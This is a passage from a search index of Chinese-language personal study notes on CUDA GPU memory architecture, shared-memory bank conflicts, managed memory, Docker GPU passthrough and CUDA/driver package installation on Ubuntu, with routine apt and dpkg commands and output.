\u7684\u9650\u5236</li> <li>\u5ef6\u8fdf\u9690\u85cf\uff1alarger set of potential work to choose from</li> </ul> <p></p> <p></p>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/16/2023-04-16-CUDA%E6%9E%B6%E6%9E%84/#memory-\u5c42\u6b21","title":"memory \u5c42\u6b21","text":"<p>In CUDA, these hardware resources are exposed in the form of a number of memory spaces, each with different properties designed for different kinds of access patterns.</p>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/16/2023-04-16-CUDA%E6%9E%B6%E6%9E%84/#global","title":"global","text":"<ul> <li>\u4e00\u822c\u7684\u6570\u636e\u5b58\u50a8</li> <li>\u5f88\u6162\uff1abandwidth: \u2248 300\u2013700 GiB/s (GDDR5/6 vs HMB2)     \u2022 non-cached coalesced access: 375 cycles     \u2022 L2 cached access: 190 cycles     \u2022 L1 caches access: 30 cycles</li> <li>cache \u8bbe\u8ba1\uff1a<ul> <li>\u4e0d\u662f\u4e3a\u4e86\u5229\u7528\u65f6\u95f4\u590d\u7528\uff0c\u800c\u662f smooth-out access patterns<ul> <li>64 B L1$, 37 B L2$ per thread</li> </ul> </li> <li>\u4e0d\u8981\u50cf CPU \u4e00\u6837\u5206\u5757\uff0c\u800c\u662f\u4f7f\u7528 shared memory</li> <li>L1 \u5199\u76f4\u8fbe\uff0cL2 \u5199\u56de</li> </ul> </li> </ul> <ul> <li>try to get coalescing per warp </li> </ul> <p>\u7c92\u5ea6\u5b9e\u9a8c</p> <ul> <li>\u6027\u80fd\u968f\u7740\u8bbf\u95ee\u7684 cacheline \u6570\u76ee\u589e\u957f\u800c\u7ebf\u6027\u964d\u4f4e </li> </ul> <p>vector load/store</p> <ul> <li>\u8ba1\u7b97\u5730\u5740\u6ca1\u529e\u6cd5\u5ef6\u8fdf\u9690\u85cf\uff0c\u56e0\u4e3a\u8bbf\u5b58\u64cd\u4f5c\u5bf9\u5176\u7ed3\u679c\u6709\u4f9d\u8d56</li> </ul> <p><code>__restrict</code>\uff1aThis instructs the compiler to assume that the input and output will never point to overlapping memory regions.</p> <ul> <li>As a result, the compiler can potentially, e.g., fetch input data through faster non-coherent caches.</li> </ul> <p>128bit \u5bbd\uff0816B\uff09</p>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/16/2023-04-16-CUDA%E6%9E%B6%E6%9E%84/#const","title":"const","text":"<ul> <li>cached<ul> <li>const cache\uff0c\u8fc7\u53bb\u53eb texture cache</li> </ul> </li> </ul> <ul> <li>read only, uniform<ul> <li>e.g.: coefficients, used to pass kernel parameters</li> </ul> </li> <li>broadcasting<ul> <li>all thread read same value</li> <li>otherwise diverged, slowdown</li> </ul> </li> <li>limited to 64 KiB</li> </ul> <ul> <li>As long as access happens uniformly, constant memory can provide very low access latencies.</li> <li>For divergent access patterns, normal global memory can typically provide better access latencies due to its different cache design (as long as the access hits the cache).</li> </ul>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/16/2023-04-16-CUDA%E6%9E%B6%E6%9E%84/#tex","title":"tex","text":"<p>optimized for 2D spatial access.</p> <ul> <li>optimal for neither row-wise nor column-wise access, it can handle both with similar efficiency.</li> </ul> <p>prior to Volta \u2022 Textures tend to perform at least as good, sometimes better \u2022 put less stress on L2 cache \u2022 L1 cache free for other tasks</p> <p>now \u2022 advanced Unified Cache (L1 + Tex) \u2022 Textures still perform best for spatially local access pattern \u2022 but can also be slower if access pattern and cache hits favor linear memory</p>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/16/2023-04-16-CUDA%E6%9E%B6%E6%9E%84/#shared-memory_1","title":"shared memory","text":"<p>crossbar</p> <ul> <li>32bit bank</li> <li>simultaneous to distinct bank </li> </ul> <p>shared memory</p> <ul> <li>32 bank, consecutive 4-byte elements map to one bank</li> <li>Each memory bank can serve 4-byte loads and stores from and to the addresses it\u2019s responsible for.</li> <li>\u540c\u4e00\u65f6\u95f4\u4e0d\u80fd\u6709\u591a\u4e2a thread \u8bbf\u95ee\u540c\u4e00\u4e2a bank<ul> <li>N-way bank conflict</li> <li>\u7279\u6b8a\u60c5\u51b5\uff0c\u8bbf\u95ee\u76f8\u540c\u5730\u5740\uff0c\u53ef\u4ee5\u5e7f\u64ad </li> </ul> </li> </ul> <p>32x32 \u7684 matrix\uff0c\u5bf9\u884c\u5217\u5206\u522b\u6c42\u548c\uff0c\u4f7f\u7528 32 \u4e2a\u7ebf\u7a0b\u5e76\u884c</p> <ul> <li>\u6bcf\u5217\u5143\u7d20\u4f4d\u4e8e\u76f8\u540c bank\uff0c\u56e0\u6b64\u884c\u6c42\u548c\u65f6\uff0c\u6bcf\u4e2a\u7ebf\u7a0b\u521a\u597d\u8bbf\u95ee\u76f8\u540c bank\uff0c\u5bfc\u81f4\u51b2\u7a81 </li> </ul> <p>trick</p> <ul> <li>\u6dfb\u52a0\u4e00\u4e2a dummy colum \u540e\uff0c\u6bcf\u884c\u6bcf\u5217\u5143\u7d20\u5747\u4f4d\u4e8e\u4e0d\u540c bank </li> </ul> <p>\u4f5c\u7528</p> <ul> <li>inter-thread communication\uff1ablock \u5185\u7684\u4e00\u4e2a\u5171\u4eab\u53d8\u91cf</li> <li>reduce global memory access -&gt; manual cache<ul> <li>\u5148\u628a\u6570\u636e\u4ece global load \u5230 shared memory \u518d\u5904\u7406</li> </ul> </li> <li>adjust global memory access pattern</li> <li>indexed access<ul> <li>\u666e\u901a\u53d8\u91cf\u6570\u7ec4\uff0c\u4f1a spill \u5230 local memory \u4e2d</li> </ul> </li> <li>combine costly operations</li> </ul> <p></p>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/16/2023-04-16-CUDA%E6%9E%B6%E6%9E%84/#part-3","title":"part 3","text":"","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/16/2023-04-16-CUDA%E6%9E%B6%E6%9E%84/#managed-memory","title":"managed memory","text":"<p>static \u5206\u914d\uff1a<code>device</code> dynamic \u5206\u914d (cpu \u4ee3\u7801\u6267\u884c\u5206\u914d)\uff1acudaMalloc</p> <p>movement</p> <ul> <li>cudaMemcpy, cudaMemcpyToSymbol, cudaMemcpyFromSymbol</li> </ul> <p>managed mem</p> <ul> <li>static: <code>__managed__</code></li> <li>dynamic: <code>cudaMallocManaged</code></li> </ul> <p>\u5728 CC(compute capac)6.0 \u4e4b\u524d\uff0cdata migration \u662f\u7c97\u7c92\u5ea6\u7684\uff0c\u4e0d\u652f\u6301 CPU \u548c GPU concurrent access\u3002 6.0 \u4e4b\u540e\uff0c\u5f15\u5165\u7ec6\u7c92\u5ea6\u7684 page fault system\uff0c\u9875\u4e3a\u7c92\u5ea6\uff0c\u6027\u80fd\u5927\u5e45\u63d0\u9ad8</p> <ul> <li>concurrent access \u4ecd\u7136\u4e0d\u80fd\u4fdd\u8bc1\u3002</li> </ul>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/16/2023-04-16-CUDA%E6%9E%B6%E6%9E%84/#its","title":"ITS","text":"<p>legacy</p> <ul> <li>\u6240\u6709\u7ebf\u7a0b\u4f4d\u4e8e\u540c\u4e00\u4e2a PC\u3002\u9700\u8981\u6267\u884c\u5b8c\u4e00\u4e2a\u5206\u652f\u540e\u518d\u6267\u884c\u53e6\u4e00\u4e2a\uff08\u56e0\u4e3a\u53ea\u6709\u4e00\u4e2a PC\uff0c\u7ebf\u7a0b\u65e0\u6cd5\u5355\u72ec\u8bb0\u5f55\u81ea\u5df1\u7684\u4f4d\u7f6e\uff09</li> <li>\u6267\u884c\u4e00\u4e2a\u5206\u652f\u65f6\uff0c\u5c06\u53e6\u4e00\u4e2a\u5206\u652f\u538b\u5165\u6808\u4e2d\u5373\u53ef\uff08dfs\uff1f\uff09\u8be5\u5206\u652f\u6267\u884c\u7ed3\u675f\u65f6\u901a\u8fc7 sync \u8bed\u53e5\u5f39\u6808\uff0c\u56de\u5230\u5408\u5e76\u70b9\u3002</li> </ul> <p>its</p> <ul> <li>\u53ef\u4ee5\u7528\u4e8e\u5b9e\u73b0\u9501</li> <li>\u53ea\u4fdd\u8bc1 resident warp \u662f\u53ef\u4ee5\u6267\u884c\u5b8c\u7684<ul> <li>thread will wait forever if their progress depends on non-redident warp</li> <li>\u4e00\u4e2a SM \u80fd\u540c\u65f6\u6267\u884c\u7684 warp \u662f\u6709\u9650\u7684\uff0c\u5982\u679c warp \u592a\u591a\uff0c\u4f1a\u653e\u5728 buffer \u91cc\uff0c\u4ecd\u6709\u53ef\u80fd\u5bfc\u81f4\u6b7b\u9501\uff1f</li> </ul> </li> </ul> <ul> <li>\u9700\u8981\u663e\u793a\u540c\u6b65 warp </li> </ul> <p>later warp primitve  reduce(&gt;8.0) </p>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/16/2023-04-16-CUDA%E6%9E%B6%E6%9E%84/#tensor-core_1","title":"tensor core","text":"<ul> <li>cublas \u4ee5\u540e\u9ed8\u8ba4\u4f1a\u5c3d\u53ef\u80fd\u4f7f\u7528 tensor core\uff0c\u9664\u975e\u5b9a\u4e49 CUDA_PREDANTIC_MATH</li> <li>baseline \u662f\u4f7f\u7528 tiling, shared memroy\uff0c\u53ef\u4ee5\u770b\u5230 cublas \u975e\u5e38\u91cd\u8981\u3002<ul> <li>\u4f46\u662f\u5206\u6790\u6a21\u578b\u5982\u4f55\u5206\u6790\u95ed\u6e90\u7684 SASS \u53ef\u6267\u884c\u6587\u4ef6\u5462\uff1f </li> </ul> </li> </ul>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/16/2023-04-16-CUDA%E6%9E%B6%E6%9E%84/#summary","title":"summary","text":"<ul> <li>03-CUDA-Fundamental-Optimization-Part-1.pdf (ornl.gov)</li> </ul>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/16/2023-04-16-CUDA%E7%BC%96%E7%A8%8B%26%E5%B7%A5%E5%85%B7/","title":"CUDA \u7f16\u7a0b&\u5de5\u5177","text":"","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/16/2023-04-16-CUDA%E7%BC%96%E7%A8%8B%26%E5%B7%A5%E5%85%B7/#\u53c2\u8003\u8d44\u6599","title":"\u53c2\u8003\u8d44\u6599","text":"<ul> <li>Tutorial 01: Say Hello to CUDA - CUDA Tutorial (cuda-tutorial.readthedocs.io)</li> <li>\u5317\u4eac\u5927\u5b66\u9ad8\u6027\u80fd\u8ba1\u7b97\u5e73\u53f0 (pku.edu.cn)</li> </ul>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/16/2023-04-16-CUDA%E7%BC%96%E7%A8%8B%26%E5%B7%A5%E5%85%B7/#docker-cuda","title":"docker cuda","text":"<p>What's the difference between the lastest nvidia-docker and nvidia container runtime\uff1f \u00b7 Issue #1268 \u00b7 NVIDIA/nvidia-docker</p> <p>\u95ee\u9898\u63cf\u8ff0\uff1a \u5728 Docker \u4e2d\u4f7f\u7528 GPU \u65f6\u9047\u5230\u9a71\u52a8\u7248\u672c\u51b2\u7a81\u95ee\u9898\uff0c\u5177\u4f53\u8868\u73b0\u5982\u4e0b\uff1a</p> <ol> <li>\u5b98\u65b9\u955c\u50cf\u6b63\u5e38\u5de5\u4f5c\uff1a     \u4f7f\u7528\u00a0<code>nvcr.io/nvidia/cuda:12.8.0-base-ubuntu22.04</code>\u00a0+\u00a0<code>--gpus all</code>\u00a0\u65f6\uff0c<code>nvidia-smi</code>\u00a0\u80fd\u6b63\u786e\u663e\u793a CUDA \u7248\u672c\uff0cPyTorch \u53ef\u8c03\u7528 GPU\u3002</li> <li>\u81ea\u5b9a\u4e49\u955c\u50cf\u5f02\u5e38\uff1a     \u57fa\u4e8e\u00a0<code>ubuntu:22.04</code>\u00a0\u81ea\u5efa\u955c\u50cf\u65f6\uff0c<code>nvidia-smi</code>\u00a0\u663e\u793a CUDA \u7248\u672c\u4e3a\u00a0<code>N/A</code>\uff0cPyTorch \u62a5\u9519\u00a0<code>No GPU driver found</code>\u3002\u82e5\u5728\u955c\u50cf\u5185\u624b\u52a8\u5b89\u88c5\u9a71\u52a8\uff0c\u5219\u51fa\u73b0\u00a0<code>NVML driver/library version mismatch</code>\uff08\u5bbf\u4e3b\u673a\u9a71\u52a8\u7248\u672c\u4e0e\u5bb9\u5668\u5185\u4e0d\u4e00\u81f4\uff09\u3002</li> <li>\u7591\u95ee\uff1a     - \u4e3a\u4f55 NVIDIA \u5b98\u65b9\u955c\u50cf\u65e0\u9700\u5b89\u88c5\u9a71\u52a8\uff08<code>apt list</code>\u00a0\u65e0\u00a0<code>nvidia-driver</code>\uff09\u5374\u80fd\u5de5\u4f5c\uff1f     - \u5982\u4f55\u89e3\u51b3\u81ea\u5b9a\u4e49\u955c\u50cf\u7684\u9a71\u52a8\u7248\u672c\u51b2\u7a81\uff1f\u5f3a\u5236\u5bf9\u9f50\u5bbf\u4e3b\u673a\u548c\u5bb9\u5668\u5185\u9a71\u52a8\u7684\u5c0f\u7248\u672c\u96be\u5ea6\u5927\uff0c\u662f\u5426\u6709\u901a\u7528\u65b9\u6848\uff1f</li> </ol>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/16/2023-04-16-CUDA%E7%BC%96%E7%A8%8B%26%E5%B7%A5%E5%85%B7/#1-\u5b98\u65b9\u955c\u50cf\u4e3a\u4f55\u65e0\u9700\u5b89\u88c5\u9a71\u52a8","title":"1. \u5b98\u65b9\u955c\u50cf\u4e3a\u4f55\u65e0\u9700\u5b89\u88c5\u9a71\u52a8\uff1f","text":"<p>NVIDIA \u5b98\u65b9\u955c\u50cf\uff08\u5982\u00a0<code>nvcr.io/nvidia/cuda</code>\uff09\u901a\u8fc7\u00a0NVIDIA Container Toolkit\u00a0\u5b9e\u73b0 GPU \u900f\u4f20\uff0c\u5176\u6838\u5fc3\u673a\u5236\u4e3a\uff1a</p> <ul> <li>\u6302\u8f7d\u5bbf\u4e3b\u673a\u9a71\u52a8\u5e93\uff1a\u5bb9\u5668\u542f\u52a8\u65f6\uff0c\u81ea\u52a8\u6302\u8f7d\u5bbf\u4e3b\u673a\u4fa7\u7684 NVIDIA \u9a71\u52a8\u5e93\uff08\u5982\u00a0<code>libcuda.so</code>\u3001<code>libnvidia-ptxjitcompiler.so</code>\uff09\u5230\u5bb9\u5668\u5185\u7684\u00a0<code>/usr/local/nvidia/lib64</code>\u3002</li> <li>\u73af\u5883\u53d8\u91cf\u914d\u7f6e\uff1a\u955c\u50cf\u5185\u5df2\u8bbe\u7f6e\u00a0<code>LD_LIBRARY_PATH</code>\uff0c\u4f18\u5148\u52a0\u8f7d\u6302\u8f7d\u7684\u5bbf\u4e3b\u673a\u9a71\u52a8\u5e93\uff0c\u800c\u975e\u5bb9\u5668\u5185\u81ea\u5e26\u7684\u5e93\u3002</li> </ul> <p>\u67e5\u770b nvidia/cuda \u955c\u50cf\u7684 layer\uff1aImage Layer Details - nvidia/cuda:12.8.0-cudnn-devel-ubuntu22.04 | Docker Hub</p> <p>\u5176\u4e2d\u786e\u5b9e\u5927\u91cf\u8bbe\u7f6e\u4e86 <pre><code>/usr/local/nvidia/lib64\n</code></pre></p> <p>\u7136\u540e\u5bb9\u5668\u5185\u8be5\u76ee\u5f55\u5374\u5e76\u4e0d\u5b58\u5728\u3002\u4e0d\u8fc7\u901a\u8fc7 locate libcuda.so \u53d1\u73b0\u786e\u5b9e\u548c\u81ea\u5df1\u7684\u955c\u50cf\u4e0d\u540c</p> <pre><code>\u279c  ~ dpkg -S /usr/lib/x86_64-linux-gnu/libcuda.so.535.183.01\nlibnvidia-compute-535:amd64: /usr/lib/x86_64-linux-gnu/libcuda.so.535.183.01\n</code></pre>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/16/2023-04-16-CUDA%E7%BC%96%E7%A8%8B%26%E5%B7%A5%E5%85%B7/#cuda-\u5b89\u88c5","title":"CUDA \u5b89\u88c5","text":"<p>\u603b\u7ed3\uff1a</p> <ul> <li>\u6700\u7b80\u5355\u65b9\u5f0f\u662f\u770b cuda \u4e0b\u8f7d\u9875\u9762\u63d0\u4f9b\u7684\u5b89\u88c5\u547d\u4ee4</li> <li>deb \u5b89\u88c5\u8c8c\u4f3c\u65e0\u6cd5\u53ea\u5b89\u88c5 cuda\uff0c\u4e0d\u5b89\u88c5\u9a71\u52a8</li> <li>runfile \u5b89\u88c5\u53ef\u4ee5\u505a\u5230\u4e0d\u91cd\u542f</li> <li>cuda-toolkit-12-1 \u5305\u542b cuda</li> <li>nvidia-driver-530 \u5305\u542b\u9a71\u52a8</li> </ul>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/16/2023-04-16-CUDA%E7%BC%96%E7%A8%8B%26%E5%B7%A5%E5%85%B7/#\u6709\u7528\u94fe\u63a5","title":"\u6709\u7528\u94fe\u63a5","text":"<ul> <li>\u5b98\u65b9\u6587\u6863\uff1acuda-installation-guide-linux 12.1 documentation (nvidia.com)</li> </ul> <p>cuda \u4e0b\u8f7d</p> <ul> <li>\u6700\u65b0\u7248\uff1aCUDA Toolkit 12.1 Downloads | NVIDIA Developer</li> <li>\u5386\u53f2\u7248\uff1aCUDA Toolkit Archive | NVIDIA Developer</li> </ul>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/16/2023-04-16-CUDA%E7%BC%96%E7%A8%8B%26%E5%B7%A5%E5%85%B7/#cuda-\u548c-driver-\u517c\u5bb9\u6027","title":"cuda \u548c driver \u517c\u5bb9\u6027","text":"<p>\u8fd0\u884c cuda \u7a0b\u5e8f\uff0c\u9700\u8981</p> <ul> <li>\u548c cuda \u7248\u672c\u517c\u5bb9\u7684\u7528\u6237\u548c\u5185\u6838\u9a71\u52a8\uff08\u6bcf\u4e2a cuda \u7248\u672c\u6709\u4e2a\u6700\u4f4e\u9a71\u52a8\u7248\u672c\uff09</li> <li>\u5982\u679c\u662f\u52a8\u6001\u94fe\u63a5\u7684\uff0c\u7cfb\u7edf\u9700\u8981\u6709 cuda \u7248\u672c\u5bf9\u5e94\u7684\u5e93</li> </ul> <p></p> <p>1. Why CUDA Compatibility \u2014 CUDA Compatibility r555 documentation</p> <p>10.x \u4e4b\u524d\uff0c\u6bcf\u6b21\u66f4\u65b0\u5230\u4e00\u4e2a\u5c0f\u7248\u672c\uff0c\u90fd\u9700\u8981\u66f4\u65b0\u9a71\u52a8\u300211.0 \u540e\u6709\u4e86\u5c0f\u7248\u672c\u517c\u5bb9\u6027\uff0c\u56e0\u6b64\u8001\u7684\u9a71\u52a8\u53ef\u4ee5\u8dd1\u65b0\u7684 cuda\u3002cuda 11.0 \u8981\u6c42\u6700\u4f4e &gt;= 450.80.02*</p> <p>CUDA applications typically statically include all the libraries (for example cudart, CUDA math libraries such as cuBLAS, cuFFT) they need, so they should work on new drivers or CUDA Toolkit installations.</p> <p>\u96be\u602a ldd cuda \u7a0b\u5e8f\u770b\u4e0d\u5230 cudart\u3002</p>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/16/2023-04-16-CUDA%E7%BC%96%E7%A8%8B%26%E5%B7%A5%E5%85%B7/#\u4e0d\u540c-metapackage","title":"\u4e0d\u540c metapackage","text":"","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/16/2023-04-16-CUDA%E7%BC%96%E7%A8%8B%26%E5%B7%A5%E5%85%B7/#gpu-driver","title":"gpu driver","text":"<ul> <li>nvidia-driver-550-server<ul> <li>\u548c headless \u8c8c\u4f3c\u51b2\u7a81\uff0c\u53ea\u80fd\u5b89\u88c5\u5176\u4e00</li> </ul> </li> </ul> <p><pre><code>nvidia-driver-535\nnvidia-driver-535-open\nnvidia-driver-535-server\nnvidia-driver-535-server-open\n</code></pre> - <code>-open</code> \u7248\u672c\u5305\u542b\u5f00\u6e90\u7684\u5185\u6838\u6a21\u5757\uff0c\u800c\u975e <code>-open</code> \u7248\u672c\u662f\u95ed\u6e90\u7684\u3002 - <code>-server</code> \u7248\u672c\u9488\u5bf9\u670d\u52a1\u5668\u548c\u8ba1\u7b97\u8d1f\u8f7d\u8fdb\u884c\u4e86\u4f18\u5316\uff0c\u800c\u975e <code>-server</code> \u7248\u672c\u4e3b\u8981\u9762\u5411\u684c\u9762\u548c\u5de5\u4f5c\u7ad9\u4f7f\u7528\u3002</p> <p>\u5176\u5b83\u7684\u5143\u5305\u5927\u90e8\u5206\u9664\u4e86 driver \u90fd\u4f1a\u5b89\u88c5\u5176\u5b83\u5e93</p> <ul> <li>nvidia-headless-550 (server, open)<ul> <li>This metapackage installs the NVIDIA driver and the libraries that enable parallel general purpose computation through CUDA and OpenCL.</li> <li>\u4e0d\u80fd\u8fd0\u884c\u56fe\u5f62\u7a0b\u5e8f\uff1aopenGL, vulkan</li> </ul> </li> <li>nvidia-dkms-550-server<ul> <li>This package builds the NVIDIA kernel module needed by the userspace driver, using DKMS. Provided that you have the kernel header packages installed, the kernel module will be built for your running kernel, and automatically rebuilt for any new kernel headers that are installed.</li> </ul> </li> <li>nvidia-headless-no-dkms-550<ul> <li>This metapackage installs the NVIDIA driver and the libraries that enable parallel general purpose computation through CUDA and OpenCL. DKMS will not be installed, and, therefore, the kernel module will not be built. . Install this package if you do not need X11 or Wayland support, which is provided by the nvidia-driver-535 metapackage.</li> <li>\u5728\u5185\u6838\u66f4\u65b0\u540e\uff0cDKMS \u53ef\u4ee5\u81ea\u52a8\u91cd\u65b0\u6784\u5efa\u9a71\u52a8\u6a21\u5757\uff0c\u4ee5\u786e\u4fdd\u4e0e\u65b0\u5185\u6838\u517c\u5bb9</li> </ul> </li> </ul>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/16/2023-04-16-CUDA%E7%BC%96%E7%A8%8B%26%E5%B7%A5%E5%85%B7/#cuda-toolkit-nvcc-etc","title":"cuda toolkit (nvcc etc)","text":"<p>cuda-toolkit-11-8</p> <ul> <li>Meta-package containing all the available toolkit packages related to native CUDA development. Contains the toolkit, samples, and documentation. Locked at CUDA Toolkit version 11.8. cuda-11-8</li> <li>Meta-package containing all the available packages required for native CUDA development. Contains the toolkit, samples, driver and documentation. Locked at CUDA Toolkit version 11.8.</li> </ul>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/16/2023-04-16-CUDA%E7%BC%96%E7%A8%8B%26%E5%B7%A5%E5%85%B7/#3\u79cd\u65b9\u5f0f","title":"3\u79cd\u65b9\u5f0f","text":"<ul> <li>\u53d1\u884c\u7248\u6e90\u81ea\u5e26\u7684<ul> <li>\u53ea\u5305\u542b nvidia-driver\uff0c\u4e0d\u5305\u542b cuda toolkit</li> </ul> </li> <li>rpm/deb packages<ul> <li>\u79bb\u7ebf\u7248 deb \u6587\u4ef6</li> <li>\u5728\u7ebf\u7248 nvidia \u6e90</li> </ul> </li> <li>runfile package<ul> <li>\u548c\u53d1\u884c\u7248\u65e0\u5173 (distribution-independent package)</li> </ul> </li> </ul>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/16/2023-04-16-CUDA%E7%BC%96%E7%A8%8B%26%E5%B7%A5%E5%85%B7/#nvidia-apt-\u6e90","title":"nvidia apt \u6e90","text":"<p>\u5305\u542b\u6240\u6709\u7248\u672c cuda\uff0cdriver\u3002\u5176\u4e2d driver \u53ef\u80fd\u6bd4\u53d1\u884c\u7248\u6e90\u4e2d\u7684 driver \u4f18\u5148\u7ea7\u66f4\u9ad8</p> <pre><code>sudo add-apt-repository \"deb https://developer.download.nvidia.com/compute/cuda/repos/ubuntu2004/x86_64/ /\"\n</code></pre>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/16/2023-04-16-CUDA%E7%BC%96%E7%A8%8B%26%E5%B7%A5%E5%85%B7/#\u79bb\u7ebf\u7248-deb","title":"\u79bb\u7ebf\u7248 deb","text":"<p>\u4f7f\u7528\u65b9\u6cd5</p> <pre><code>sudo dpkg -i cuda-repo-xxx.deb\n\nsudo cp /var/cuda-repo-xxx/cuda-*-keyring.gpg /usr/share/keyrings/\n\nsudo apt update\nsudo apt install cuda-toolkit-xxx\n</code></pre> <p>\u67e5\u770b\u79bb\u7ebf\u65b9\u6cd5\u5b89\u88c5\u7684 cuda \u7248\u672c</p> <pre><code>~ dpkg --list |grep cuda-repo\nii  cuda-repo-ubuntu2004-11-8-local                             11.8.0-520.61.05-1                                             amd64        cuda repository configuration files\nii  cuda-repo-ubuntu2004-12-1-local                             12.1.0-530.30.02-1                                             amd64        cuda repository configuration files\n</code></pre> <p>\u53ef\u4ee5\u770b\u5230cuda-repo \u5305\u542b\u4e00\u4e2a apt list \u6587\u4ef6</p> <pre><code>~ dkpg -L cuda-repo-ubuntu2004-11-8-local\n/etc/apt/sources.list.d/cuda-ubuntu2004-11-8-local.list\n</code></pre> <p>\u5185\u5bb9\u4e3a</p> <pre><code>fyyuan@snode6 \u279c  ~ cat /etc/apt/sources.list.d/cuda-ubuntu2004-11-8-local.list\ndeb [signed-by=/usr/share/keyrings/cuda-368EAC11-keyring.gpg] file:///var/cuda-repo-ubuntu2004-11-8-local /\n</code></pre> <p>\u5b89\u88c5 deb \u540e\uff0c\u662f\u6dfb\u52a0\u4e86\u4e00\u4e2a repo\u3002\u8fd8\u9700\u8981\u518d\u624b\u52a8 install cuda\u3002 \u4e0d\u77e5\u4e3a\u4f55\u5b89\u88c5 cuda \u65f6\u4e00\u5b9a\u4f1a\u81ea\u52a8\u66f4\u65b0 driver\uff0c\u800c\u4f7f\u7528 runfile \u65b9\u5f0f\uff0c\u5219\u53ef\u4ee5\u9009\u62e9\u4e0d\u5b89\u88c5\u9a71\u52a8\u3002</p> <ul> <li>\u95ee\u9898\u5728\u4e8e cuda \u662f\u6700\u5927\u7684\u4e00\u4e2a metapackage\uff0c\u5b89\u88c5 cuda-toolkit-xx \u5c31\u597d\u4e86</li> </ul> <ul> <li>cuda-toolkit-12-1</li> <li>nvidia-driver-530</li> </ul> <pre><code>fyyuan@snode6 \u279c  archive sudo apt install cuda --no-install-recommends\nReading package lists... Done\nBuilding dependency tree\nReading state information... Done\n\nRecommended packages:\n  libnvidia-compute-530:i386 libnvidia-decode-530:i386 libnvidia-encode-530:i386 libnvidia-fbc1-530:i386 libnvidia-gl-530:i386\n\nThe following packages will be REMOVED:\n  cuda-drivers-495 libnvidia-cfg1-495 libnvidia-compute-495 libnvidia-decode-495 libnvidia-encode-495 libnvidia-extra-495 libnvidia-fbc1-495 libnvidia-gl-495 nvidia-compute-utils-495 nvidia-dkms-495 nvidia-driver-495 nvidia-kernel-common-495 nvidia-kernel-source-495\n  nvidia-utils-495 xserver-xorg-video-nvidia-495\n\nThe following NEW packages will be installed:\n  cuda-12-1 cuda-cccl-12-1 cuda-command-line-tools-12-1 cuda-compiler-12-1 cuda-cudart-12-1 cuda-cudart-dev-12-1 cuda-cuobjdump-12-1 cuda-cupti-12-1 cuda-cupti-dev-12-1 cuda-cuxxfilt-12-1 cuda-demo-suite-12-1 cuda-documentation-12-1 cuda-driver-dev-12-1 cuda-drivers-530\n  cuda-gdb-12-1 cuda-libraries-12-1 cuda-libraries-dev-12-1 cuda-nsight-12-1 cuda-nsight-compute-12-1 cuda-nsight-systems-12-1 cuda-nvcc-12-1 cuda-nvdisasm-12-1 cuda-nvml-dev-12-1 cuda-nvprof-12-1 cuda-nvprune-12-1 cuda-nvrtc-12-1 cuda-nvrtc-dev-12-1 cuda-nvtx-12-1 cuda-nvvp-12-1\n  cuda-opencl-12-1 cuda-opencl-dev-12-1 cuda-profiler-api-12-1 cuda-runtime-12-1 cuda-sanitizer-12-1 **cuda-toolkit-12-1** cuda-toolkit-12-1-config-common cuda-toolkit-12-config-common cuda-tools-12-1 cuda-visual-tools-12-1 gds-tools-12-1 libcublas-12-1 libcublas-dev-12-1\n  libcufft-12-1 libcufft-dev-12-1 libcufile-12-1 libcufile-dev-12-1 libcurand-12-1 libcurand-dev-12-1 libcusolver-12-1 libcusolver-dev-12-1 libcusparse-12-1 libcusparse-dev-12-1 libnpp-12-1 libnpp-dev-12-1 libnvidia-cfg1-530 libnvidia-common-530 libnvidia-compute-530\n  libnvidia-decode-530 libnvidia-encode-530 libnvidia-extra-530 libnvidia-fbc1-530 libnvidia-gl-530 libnvjitlink-12-1 libnvjitlink-dev-12-1 libnvjpeg-12-1 libnvjpeg-dev-12-1 libnvvm-samples-12-1 nsight-compute-2023.1.0 nsight-systems-2023.1.2 nvidia-compute-utils-530\n  nvidia-dkms-530 **nvidia-driver-530** nvidia-kernel-common-530 nvidia-kernel-source-530 nvidia-utils-530 xserver-xorg-video-nvidia-530\nThe following packages will be upgraded:\n  cuda cuda-drivers nvidia-modprobe nvidia-settings\n4 